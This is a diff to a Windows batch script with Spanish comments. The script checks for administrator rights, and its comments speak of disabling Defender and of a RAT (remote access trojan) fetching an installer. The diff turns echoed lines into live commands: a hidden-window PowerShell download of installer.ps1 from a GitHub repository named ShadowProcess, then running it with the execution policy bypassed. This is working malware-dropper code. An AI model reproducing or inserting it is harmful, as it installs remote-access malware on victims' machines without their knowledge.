@@ -3,7 +3,7 @@
 
 
 @REM  Verifica permisos administrativos que podremos usar para ejecutar en otros archivos.
-    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
 >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
 ) ELSE (
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
@@ -30,5 +30,5 @@ if '%errorlevel%' NEQ '0' (
 
 @REM Apagar el defender 3:)
 @REM Rat obteniendo installer 
-echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1 -OutFile installer.ps1"
-echo powershell -ep bypass -c "./installer.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1 -OutFile installer.ps1"
+powershell -ep bypass -c "./installer.ps1"
